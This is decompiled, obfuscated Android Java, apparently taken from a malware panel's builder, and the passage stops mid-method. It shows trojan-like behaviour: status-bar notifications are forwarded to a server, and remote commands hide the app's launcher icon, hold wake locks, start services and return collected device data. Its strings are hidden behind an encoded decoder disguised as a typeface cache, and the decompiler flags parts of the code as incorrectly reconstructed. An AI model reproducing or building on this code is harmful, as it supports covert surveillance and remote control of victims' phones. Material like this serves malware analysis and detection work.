package v.s;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import android.service.notification.StatusBarNotification;
import app.mobilex.plus.services.ConfigLWJob;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.services.UpdateXPBridge;
import app.mobilex.plus.util.TypefaceCache;
import java.util.Map;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class z1jyE6u5MXAb3Rr extends jh03IwKTfxTtT1U implements NhN5GSKLYh6STld4 {
    public Object D5P1xCAyuvgF;
    public final /* synthetic */ String b1EoSIRjJHO5;
    public final /* synthetic */ Object gIIiyi2ddlMDR0;
    public final /* synthetic */ Object gmNWMfvn6zlEj;
    public final /* synthetic */ Object hjneShqpF9Tis4;
    public int ibVTtJUNfrGYbW;
    public final /* synthetic */ String pyu8ovAipBTLYAiKab;
    public final /* synthetic */ int xDyLpEZyrcKVe0 = 0;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public z1jyE6u5MXAb3Rr(ConfigLWJob configLWJob, String str, String str2, String str3, String str4, StatusBarNotification statusBarNotification, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        super(2, b9xroaxfr1fmoo2q);
        this.D5P1xCAyuvgF = configLWJob;
        this.b1EoSIRjJHO5 = str;
        this.pyu8ovAipBTLYAiKab = str2;
        this.hjneShqpF9Tis4 = str3;
        this.gmNWMfvn6zlEj = str4;
        this.gIIiyi2ddlMDR0 = statusBarNotification;
    }

    private static /* synthetic */ void nnul() {
    }

    @Override // v.s.NhN5GSKLYh6STld4
    public final Object b1EoSIRjJHO5(Object obj, Object obj2) {
        wh3Lv6S5rs6zqjV wh3lv6s5rs6zqjv = (wh3Lv6S5rs6zqjV) obj;
        b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q = (b9xRoaXFR1fmOO2Q) obj2;
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                break;
        }
        return ((z1jyE6u5MXAb3Rr) dDIMxZXP1V8HdM(wh3lv6s5rs6zqjv, b9xroaxfr1fmoo2q)).vekpFI4d1Nc4fakF(Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM);
    }

    @Override // v.s.CWIOrUfHtKyaxQib0W
    public final b9xRoaXFR1fmOO2Q dDIMxZXP1V8HdM(Object obj, b9xRoaXFR1fmOO2Q b9xroaxfr1fmoo2q) {
        switch (this.xDyLpEZyrcKVe0) {
            case 0:
                return new z1jyE6u5MXAb3Rr((ConfigLWJob) this.D5P1xCAyuvgF, this.b1EoSIRjJHO5, this.pyu8ovAipBTLYAiKab, (String) this.hjneShqpF9Tis4, (String) this.gmNWMfvn6zlEj, (StatusBarNotification) this.gIIiyi2ddlMDR0, b9xroaxfr1fmoo2q);
            default:
                return new z1jyE6u5MXAb3Rr(this.b1EoSIRjJHO5, (UpdateXPBridge) this.hjneShqpF9Tis4, this.pyu8ovAipBTLYAiKab, (Map) this.gmNWMfvn6zlEj, (JSONObject) this.gIIiyi2ddlMDR0, b9xroaxfr1fmoo2q);
        }
    }

    /* JADX WARN: Code duplicated, block: B:172:0x040c  */
    /* JADX WARN: Code duplicated, block: B:212:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:213:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:230:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:231:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Code duplicated, block: B:41:0x00da A[Catch: Exception -> 0x0108, TRY_LEAVE, TryCatch #5 {Exception -> 0x0108, blocks: (B:41:0x00da, B:37:0x00c7), top: B:203:0x00c7 }] */
    /* JADX WARN: Code duplicated, block: B:81:0x01e7  */
    /* JADX WARN: Code duplicated, block: B:82:0x01e9 A[Catch: all -> 0x021d, PHI: r1
      0x01e9: PHI (r1v46 ??) = (r1v55 ??), (r1v56 ??) binds: [B:80:0x01e5, B:27:0x008f] A[DONT_GENERATE, DONT_INLINE], TryCatch #7 {all -> 0x021d, blocks: (B:85:0x0200, B:82:0x01e9, B:79:0x01da), top: B:207:0x01da }] */
    /* JADX WARN: Code duplicated, block: B:84:0x01fe  */
    /* JADX WARN: Code duplicated, block: B:88:0x0218 A[Catch: Exception -> 0x013b, TryCatch #4 {Exception -> 0x013b, blocks: (B:86:0x0210, B:88:0x0218, B:90:0x021e, B:92:0x0224, B:93:0x0227, B:52:0x0111, B:54:0x011e, B:56:0x0133, B:59:0x013d, B:62:0x0156, B:66:0x0171, B:94:0x0229, B:96:0x0235, B:98:0x023b, B:108:0x0266, B:110:0x0272, B:112:0x0278), top: B:202:0x0111 }] */
    /* JADX WARN: Code duplicated, block: B:92:0x0224 A[Catch: Exception -> 0x013b, TryCatch #4 {Exception -> 0x013b, blocks: (B:86:0x0210, B:88:0x0218, B:90:0x021e, B:92:0x0224, B:93:0x0227, B:52:0x0111, B:54:0x011e, B:56:0x0133, B:59:0x013d, B:62:0x0156, B:66:0x0171, B:94:0x0229, B:96:0x0235, B:98:0x023b, B:108:0x0266, B:110:0x0272, B:112:0x0278), top: B:202:0x0111 }] */
    /* JADX WARN: Code restructure failed: missing block: B:101:0x0253, code lost:
    
        if (r0 == r9) goto L174;
     */
    /* JADX WARN: Code restructure failed: missing block: B:175:0x042d, code lost:
    
        return r8;
     */
    /* JADX WARN: Code restructure failed: missing block: B:44:0x00ff, code lost:
    
        if (r0 == r9) goto L174;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r11v2 */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r1v10, types: [android.os.PowerManager$WakeLock] */
    /* JADX WARN: Type inference failed for: r1v25 */
    /* JADX WARN: Type inference failed for: r1v34 */
    /* JADX WARN: Type inference failed for: r1v38 */
    /* JADX WARN: Type inference failed for: r1v39 */
    /* JADX WARN: Type inference failed for: r1v43, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r1v46, types: [java.lang.Object] */
    /* JADX WARN: Type inference failed for: r1v49 */
    /* JADX WARN: Type inference failed for: r1v50, types: [android.os.PowerManager$WakeLock] */
    /* JADX WARN: Type inference failed for: r1v53 */
    /* JADX WARN: Type inference failed for: r1v54 */
    /* JADX WARN: Type inference failed for: r1v55 */
    /* JADX WARN: Type inference failed for: r1v56 */
    /* JADX WARN: Type inference failed for: r1v57 */
    /* JADX WARN: Type inference failed for: r1v58 */
    /* JADX WARN: Type inference failed for: r1v59 */
    /* JADX WARN: Type inference failed for: r1v60 */
    /* JADX WARN: Type inference failed for: r1v61 */
    /* JADX WARN: Type inference failed for: r1v7 */
    /* JADX WARN: Type inference failed for: r1v8 */
    /* JADX WARN: Type inference failed for: r1v9, types: [java.lang.String] */
    @Override // v.s.CWIOrUfHtKyaxQib0W
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object vekpFI4d1Nc4fakF(Object obj) throws Throwable {
        Object objK7eEOBPYP9VIoHWTe;
        ?? r1;
        String strObtain;
        String message;
        String str;
        String strOptString;
        String strOptString2;
        ?? r2;
        ktukzhfmAkOuMU ktukzhfmakoumu;
        Context applicationContext;
        int i = this.xDyLpEZyrcKVe0;
        Eo0e0FTdv96U7KeCzoB eo0e0FTdv96U7KeCzoB = Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
        ?? r3 = "call to 'resume' before 'invoke' with coroutine";
        pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
        Object obj2 = this.hjneShqpF9Tis4;
        Object obj3 = this.gIIiyi2ddlMDR0;
        Object obj4 = this.gmNWMfvn6zlEj;
        switch (i) {
            case 0:
                int i2 = this.ibVTtJUNfrGYbW;
                try {
                    if (i2 == 0) {
                        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                        String str2 = (String) obj4;
                        Long l = new Long(((StatusBarNotification) obj3).getPostTime());
                        this.ibVTtJUNfrGYbW = 1;
                        objK7eEOBPYP9VIoHWTe = ktukzhfmAkOuMU.dDIMxZXP1V8HdM.K7eEOBPYP9VIoHWTe(((ConfigLWJob) this.D5P1xCAyuvgF).getApplicationContext(), this.b1EoSIRjJHO5, this.pyu8ovAipBTLYAiKab, (String) obj2, str2, l, this);
                        if (objK7eEOBPYP9VIoHWTe == pjn1l01kdmwnpcy0dad) {
                            return pjn1l01kdmwnpcy0dad;
                        }
                    } else {
                        if (i2 != 1) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                        objK7eEOBPYP9VIoHWTe = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                    }
                    if (!(objK7eEOBPYP9VIoHWTe instanceof VSZeS5mia3yEXbAe)) {
                        String unused = ConfigLWJob.TAG;
                        TypefaceCache.obtain("001300630048008F00B000AC00D700A90037002C001B");
                        return eo0e0FTdv96U7KeCzoB;
                    }
                    String unused2 = ConfigLWJob.TAG;
                    TypefaceCache.obtain("001300630048008F00B000B900D300AE002F0073005F00DD00B0");
                    Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(objK7eEOBPYP9VIoHWTe);
                    if (thDDIMxZXP1V8HdM == null) {
                        return eo0e0FTdv96U7KeCzoB;
                    }
                    thDDIMxZXP1V8HdM.getMessage();
                    return eo0e0FTdv96U7KeCzoB;
                } catch (Exception e) {
                    String unused3 = ConfigLWJob.TAG;
                    TypefaceCache.obtain("000600640049008800E200FF00C200B5002C0075005E009400E300B600DC00A0006300780054009300F900B900DB00A4002200620052008800FE00E50092");
                    e.getMessage();
                    return eo0e0FTdv96U7KeCzoB;
                }
            default:
                Map map = (Map) obj4;
                JSONObject jSONObject = (JSONObject) obj3;
                String str3 = this.b1EoSIRjJHO5;
                UpdateXPBridge updateXPBridge = (UpdateXPBridge) obj2;
                int i3 = this.ibVTtJUNfrGYbW;
                int i4 = 7 - 5;
                String str4 = this.pyu8ovAipBTLYAiKab;
                try {
                    try {
                        try {
                            switch (i3) {
                                case 0:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    int iHashCode = str3.hashCode();
                                    if (str3.equals(TypefaceCache.obtain("0033007F00550080"))) {
                                        try {
                                            ktukzhfmAkOuMU ktukzhfmakoumu2 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                            Context applicationContext2 = updateXPBridge.getApplicationContext();
                                            this.ibVTtJUNfrGYbW = 1;
                                            if (ktukzhfmakoumu2.tne6mXOUFKdd(applicationContext2, this) != pjn1l01kdmwnpcy0dad) {
                                                if (str4 != null) {
                                                    return eo0e0FTdv96U7KeCzoB;
                                                }
                                                ktukzhfmAkOuMU ktukzhfmakoumu3 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                String strObtain2 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                                JSONObject jSONObjectPut = new JSONObject().put(TypefaceCache.obtain("0033007900550080"), true);
                                                this.ibVTtJUNfrGYbW = i4;
                                                String str5 = str4;
                                                Object objXfn2GJwmGqs7kWW = ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str5, strObtain2, jSONObjectPut, null, this, 8);
                                                r3 = str5;
                                                break;
                                            }
                                        } catch (Exception e2) {
                                            e = e2;
                                            str = str4;
                                            r1 = str;
                                            int i5 = UpdateXPBridge.w9sT1Swbhx3hs;
                                            TypefaceCache.obtain("000000790056008A00F100B100D600E70026006E005E008400E500AB00DB00A8002D0036005D008600F900B300D700A300790036");
                                            e.getMessage();
                                            if (r1 == 0) {
                                                return eo0e0FTdv96U7KeCzoB;
                                            }
                                            ktukzhfmAkOuMU ktukzhfmakoumu4 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                            strObtain = TypefaceCache.obtain("002500770052008B00F500BB");
                                            message = e.getMessage();
                                            this.D5P1xCAyuvgF = null;
                                            this.ibVTtJUNfrGYbW = 13;
                                            if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(r1, strObtain, null, message, this, 68 - 64) != pjn1l01kdmwnpcy0dad) {
                                                return eo0e0FTdv96U7KeCzoB;
                                            }
                                        }
                                    } else {
                                        str = str4;
                                        try {
                                            if (str3.equals(TypefaceCache.obtain("002500790049008400F5008000C500A600280073"))) {
                                                int i6 = UpdateXPBridge.w9sT1Swbhx3hs;
                                                TypefaceCache.obtain("00050059006900A400D5008000E5008600080053001B009500F500BC00D700AE00350073005F00C700BD00FF00D300A000240064005E009400E300B600C400A200630061005A008C00F500F200C700B70062");
                                                String strObtain3 = (String) map.get(TypefaceCache.obtain("00360064005C008200FE00BC00CB"));
                                                if (strObtain3 == null) {
                                                    strObtain3 = TypefaceCache.obtain("002D00790049008A00F100B3");
                                                }
                                                PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) updateXPBridge.getApplicationContext().getSystemService("power")).newWakeLock(okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strObtain3, TypefaceCache.obtain("002000640052009300F900BC00D300AB")) ? 805306394 : 1, TypefaceCache.obtain("00220066004B00DD00F600B000C000A400260049004C008600FB00BA"));
                                                wakeLockNewWakeLock.acquire(okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(strObtain3, TypefaceCache.obtain("002000640052009300F900BC00D300AB")) ? 10000L : 30000L);
                                                try {
                                                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(map.get(TypefaceCache.obtain("003100730048009300F100AD00C60098003000730049009100F900BC00D7")), "true")) {
                                                        Intent intent = new Intent(updateXPBridge.getApplicationContext(), (Class<?>) SyncQYAdapter.class);
                                                        intent.setAction(TypefaceCache.obtain("00050055007600B800C7009E00F9008200160046"));
                                                        updateXPBridge.getApplicationContext().startForegroundService(intent);
                                                    }
                                                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(map.get(TypefaceCache.obtain("003100730048008400F800BA00D600B2002F00730064008600FC00BE00C000AA0030")), "true")) {
                                                        TypefaceCache.obtain("001100730048008400F800BA00D600B2002F007F0055008000B000BE00DE00AB006300770057008600E200B200C100E7002500640054008A00B000B900DD00B5002000730064009000F100B400D7");
                                                        String str6 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                                        y6jRGLEWNMir.hjneShqpF9Tis4(updateXPBridge.getApplicationContext());
                                                    }
                                                    ktukzhfmAkOuMU ktukzhfmakoumu5 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                    Context applicationContext3 = updateXPBridge.getApplicationContext();
                                                    this.D5P1xCAyuvgF = wakeLockNewWakeLock;
                                                    this.ibVTtJUNfrGYbW = 3;
                                                    if (ktukzhfmakoumu5.tne6mXOUFKdd(applicationContext3, this) != pjn1l01kdmwnpcy0dad) {
                                                        r3 = wakeLockNewWakeLock;
                                                        try {
                                                            this.D5P1xCAyuvgF = r3;
                                                            this.ibVTtJUNfrGYbW = 4;
                                                            r2 = r3;
                                                            if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(3000L, this) == pjn1l01kdmwnpcy0dad) {
                                                                ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                                applicationContext = updateXPBridge.getApplicationContext();
                                                                this.D5P1xCAyuvgF = r2;
                                                                this.ibVTtJUNfrGYbW = 5;
                                                                r3 = r2;
                                                                if (ktukzhfmakoumu.tne6mXOUFKdd(applicationContext, this) == pjn1l01kdmwnpcy0dad) {
                                                                }
                                                                String str7 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                                                y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(updateXPBridge.getApplicationContext());
                                                                int i7 = UpdateXPBridge.w9sT1Swbhx3hs;
                                                                TypefaceCache.obtain("00050059006900A400D5008000E5008600080053001B008400FF00B200C200AB00260062005E008300B000AC00C700A4002000730048009400F600AA00DE00AB003A");
                                                                if (r3.isHeld()) {
                                                                    return eo0e0FTdv96U7KeCzoB;
                                                                }
                                                                r3.release();
                                                                return eo0e0FTdv96U7KeCzoB;
                                                            }
                                                        } catch (Throwable th) {
                                                            th = th;
                                                            if (r3.isHeld()) {
                                                                r3.release();
                                                            }
                                                            throw th;
                                                        }
                                                    }
                                                } catch (Throwable th2) {
                                                    th = th2;
                                                    r3 = wakeLockNewWakeLock;
                                                    if (r3.isHeld()) {
                                                        r3.release();
                                                    }
                                                    throw th;
                                                }
                                            } else if (str3.equals(TypefaceCache.obtain("00240073004F00B800E300B200C10098002200640058008F00F900A900D7"))) {
                                                JSONObject jSONObjectJXn4Qf7zpnLjP5 = UpdateXPBridge.JXn4Qf7zpnLjP5(updateXPBridge);
                                                if (str == null) {
                                                    return eo0e0FTdv96U7KeCzoB;
                                                }
                                                ktukzhfmAkOuMU ktukzhfmakoumu6 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                String strObtain4 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                                this.ibVTtJUNfrGYbW = 6;
                                                String str8 = str;
                                                Object objXfn2GJwmGqs7kWW2 = ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str8, strObtain4, jSONObjectJXn4Qf7zpnLjP5, null, this, 97 - 89);
                                                r3 = str8;
                                                break;
                                            } else {
                                                try {
                                                    if (iHashCode == 1247787042 || iHashCode == 747687698) {
                                                        if (jSONObject == null || (strOptString = jSONObject.optString(TypefaceCache.obtain("0033007E0054008900F5"))) == null) {
                                                            strOptString = jSONObject != null ? jSONObject.optString(TypefaceCache.obtain("002D00630056008500F500AD")) : null;
                                                        }
                                                        if (jSONObject == null || (strOptString2 = jSONObject.optString(TypefaceCache.obtain("002E00730048009400F100B800D7"))) == null) {
                                                            strOptString2 = jSONObject != null ? jSONObject.optString(TypefaceCache.obtain("0037007300430093")) : null;
                                                        }
                                                        if (strOptString == null || strOptString2 == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        JSONObject jSONObjectEe8d2j4S9Vm5yGuR = UpdateXPBridge.Ee8d2j4S9Vm5yGuR(updateXPBridge, strOptString, strOptString2);
                                                        if (str == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        ktukzhfmAkOuMU ktukzhfmakoumu7 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                        String strObtain5 = jSONObjectEe8d2j4S9Vm5yGuR.optBoolean(TypefaceCache.obtain("0030007300550093"), false) ? TypefaceCache.obtain("0026006E005E008400E500AB00D700A3") : TypefaceCache.obtain("002500770052008B00F500BB");
                                                        this.ibVTtJUNfrGYbW = 7;
                                                        if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str, strObtain5, jSONObjectEe8d2j4S9Vm5yGuR, null, this, 8) != pjn1l01kdmwnpcy0dad) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                    } else if (str3.equals(TypefaceCache.obtain("00240073004F00B800F300B000DC00B300220075004F0094"))) {
                                                        JSONObject jSONObjectW9sT1Swbhx3hs = UpdateXPBridge.w9sT1Swbhx3hs(updateXPBridge);
                                                        if (str == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        ktukzhfmAkOuMU ktukzhfmakoumu8 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                        String strObtain6 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                                        this.ibVTtJUNfrGYbW = 8;
                                                        if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str, strObtain6, jSONObjectW9sT1Swbhx3hs, null, this, (-57) + 65) != pjn1l01kdmwnpcy0dad) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                    } else if (str3.equals(TypefaceCache.obtain("00240073004F00B800F100AF00C200B4"))) {
                                                        JSONObject jSONObjectVekpFI4d1Nc4fakF = UpdateXPBridge.vekpFI4d1Nc4fakF(updateXPBridge);
                                                        if (str == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        ktukzhfmAkOuMU ktukzhfmakoumu9 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                        String strObtain7 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                                        this.ibVTtJUNfrGYbW = 9;
                                                        if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str, strObtain7, jSONObjectVekpFI4d1Nc4fakF, null, this, 8) != pjn1l01kdmwnpcy0dad) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                    } else if (str3.equals(TypefaceCache.obtain("002B007F005F008200CF00B600D100A8002D"))) {
                                                        int i8 = UpdateXPBridge.w9sT1Swbhx3hs;
                                                        updateXPBridge.getPackageManager().setComponentEnabledSetting(new ComponentName(updateXPBridge, updateXPBridge.getPackageName() + TypefaceCache.obtain("006D00400052009400F900BD00DE00A20002007A0052008600E3")), i4, 1);
                                                        if (str == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        ktukzhfmAkOuMU ktukzhfmakoumu10 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                        String strObtain8 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                                        this.ibVTtJUNfrGYbW = 10;
                                                        if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str, strObtain8, null, null, this, 12) != pjn1l01kdmwnpcy0dad) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                    } else if (str3.equals(TypefaceCache.obtain("0030007E0054009000CF00B600D100A8002D"))) {
                                                        int i9 = UpdateXPBridge.w9sT1Swbhx3hs;
                                                        updateXPBridge.getPackageManager().setComponentEnabledSetting(new ComponentName(updateXPBridge, updateXPBridge.getPackageName() + TypefaceCache.obtain("006D00400052009400F900BD00DE00A20002007A0052008600E3")), 1, 1);
                                                        if (str == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        ktukzhfmAkOuMU ktukzhfmakoumu11 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                        String strObtain9 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                                        this.ibVTtJUNfrGYbW = 11;
                                                        if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str, strObtain9, null, null, this, 12) != pjn1l01kdmwnpcy0dad) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                    } else {
                                                        int i10 = UpdateXPBridge.w9sT1Swbhx3hs;
                                                        TypefaceCache.obtain("001600780050008900FF00A800DC00E7002000790056008A00F100B100D600FD0063");
                                                        if (str == null) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                        ktukzhfmAkOuMU ktukzhfmakoumu12 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                        String strObtain10 = TypefaceCache.obtain("002500770052008B00F500BB");
                                                        String strObtain11 = TypefaceCache.obtain("001600780050008900FF00A800DC00E7002000790056008A00F100B100D6");
                                                        this.ibVTtJUNfrGYbW = 12;
                                                        if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str, strObtain10, null, strObtain11, this, 4) != pjn1l01kdmwnpcy0dad) {
                                                            return eo0e0FTdv96U7KeCzoB;
                                                        }
                                                    }
                                                } catch (Exception e3) {
                                                    e = e3;
                                                    r1 = iHashCode;
                                                    int i11 = UpdateXPBridge.w9sT1Swbhx3hs;
                                                    TypefaceCache.obtain("000000790056008A00F100B100D600E70026006E005E008400E500AB00DB00A8002D0036005D008600F900B300D700A300790036");
                                                    e.getMessage();
                                                    if (r1 == 0) {
                                                        return eo0e0FTdv96U7KeCzoB;
                                                    }
                                                    ktukzhfmAkOuMU ktukzhfmakoumu13 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                                    strObtain = TypefaceCache.obtain("002500770052008B00F500BB");
                                                    message = e.getMessage();
                                                    this.D5P1xCAyuvgF = null;
                                                    this.ibVTtJUNfrGYbW = 13;
                                                    if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(r1, strObtain, null, message, this, 68 - 64) != pjn1l01kdmwnpcy0dad) {
                                                        return eo0e0FTdv96U7KeCzoB;
                                                    }
                                                }
                                            }
                                        } catch (Exception e4) {
                                            e = e4;
                                            r1 = str;
                                            int i12 = UpdateXPBridge.w9sT1Swbhx3hs;
                                            TypefaceCache.obtain("000000790056008A00F100B100D600E70026006E005E008400E500AB00DB00A8002D0036005D008600F900B300D700A300790036");
                                            e.getMessage();
                                            if (r1 == 0) {
                                                return eo0e0FTdv96U7KeCzoB;
                                            }
                                            ktukzhfmAkOuMU ktukzhfmakoumu14 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                            strObtain = TypefaceCache.obtain("002500770052008B00F500BB");
                                            message = e.getMessage();
                                            this.D5P1xCAyuvgF = null;
                                            this.ibVTtJUNfrGYbW = 13;
                                            if (ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(r1, strObtain, null, message, this, 68 - 64) != pjn1l01kdmwnpcy0dad) {
                                                return eo0e0FTdv96U7KeCzoB;
                                            }
                                            return pjn1l01kdmwnpcy0dad;
                                        }
                                    }
                                    return pjn1l01kdmwnpcy0dad;
                                case 1:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                    if (str4 != null) {
                                        return eo0e0FTdv96U7KeCzoB;
                                    }
                                    ktukzhfmAkOuMU ktukzhfmakoumu15 = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    String strObtain12 = TypefaceCache.obtain("0026006E005E008400E500AB00D700A3");
                                    JSONObject jSONObjectPut2 = new JSONObject().put(TypefaceCache.obtain("0033007900550080"), true);
                                    this.ibVTtJUNfrGYbW = i4;
                                    String str9 = str4;
                                    Object objXfn2GJwmGqs7kWW3 = ktukzhfmAkOuMU.xfn2GJwmGqs7kWW(str9, strObtain12, jSONObjectPut2, null, this, 8);
                                    r3 = str9;
                                    break;
                                    break;
                                case 2:
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    Object obj5 = ((roAK4OF9CtSmlCJgpQ) obj).w9sT1Swbhx3hs;
                                    return eo0e0FTdv96U7KeCzoB;
                                case 3:
                                    PowerManager.WakeLock wakeLock = (PowerManager.WakeLock) this.D5P1xCAyuvgF;
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                    r3 = wakeLock;
                                    this.D5P1xCAyuvgF = r3;
                                    this.ibVTtJUNfrGYbW = 4;
                                    r2 = r3;
                                    if (gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(3000L, this) == pjn1l01kdmwnpcy0dad) {
                                        ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                        applicationContext = updateXPBridge.getApplicationContext();
                                        this.D5P1xCAyuvgF = r2;
                                        this.ibVTtJUNfrGYbW = 5;
                                        r3 = r2;
                                        if (ktukzhfmakoumu.tne6mXOUFKdd(applicationContext, this) == pjn1l01kdmwnpcy0dad) {
                                        }
                                        String str10 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                        y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(updateXPBridge.getApplicationContext());
                                        int i13 = UpdateXPBridge.w9sT1Swbhx3hs;
                                        TypefaceCache.obtain("00050059006900A400D5008000E5008600080053001B008400FF00B200C200AB00260062005E008300B000AC00C700A4002000730048009400F600AA00DE00AB003A");
                                        if (r3.isHeld()) {
                                            return eo0e0FTdv96U7KeCzoB;
                                        }
                                        r3.release();
                                        return eo0e0FTdv96U7KeCzoB;
                                    }
                                    return pjn1l01kdmwnpcy0dad;
                                case 4:
                                    PowerManager.WakeLock wakeLock2 = (PowerManager.WakeLock) this.D5P1xCAyuvgF;
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    r2 = wakeLock2;
                                    ktukzhfmakoumu = ktukzhfmAkOuMU.dDIMxZXP1V8HdM;
                                    applicationContext = updateXPBridge.getApplicationContext();
                                    this.D5P1xCAyuvgF = r2;
                                    this.ibVTtJUNfrGYbW = 5;
                                    r3 = r2;
                                    if (ktukzhfmakoumu.tne6mXOUFKdd(applicationContext, this) == pjn1l01kdmwnpcy0dad) {
                                        return pjn1l01kdmwnpcy0dad;
                                    }
                                    String str11 = SyncQYAdapter.ECwLkmPW1UKz7J6E;
                                    y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(updateXPBridge.getApplicationContext());
                                    int i14 = UpdateXPBridge.w9sT1Swbhx3hs;
                                    TypefaceCache.obtain("00050059006900A400D5008000E5008600080053001B008400FF00B200C200AB00260062005E008300B000AC00C700A4002000730048009400F600AA00DE00AB003A");
                                    if (r3.isHeld()) {
                                        return eo0e0FTdv96U7KeCzoB;
                                    }
                                    r3.release();
                                    return eo0e0FTdv96U7KeCzoB;
                                case 5:
                                    PowerManager.WakeLock wakeLock3 = (PowerManager.WakeLock) this.D5P1xCAyuvgF;
                                    SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
                                    ((roAK4OF9CtSmlCJgpQ) obj).getClass();
                                    r3 = wakeLock3;
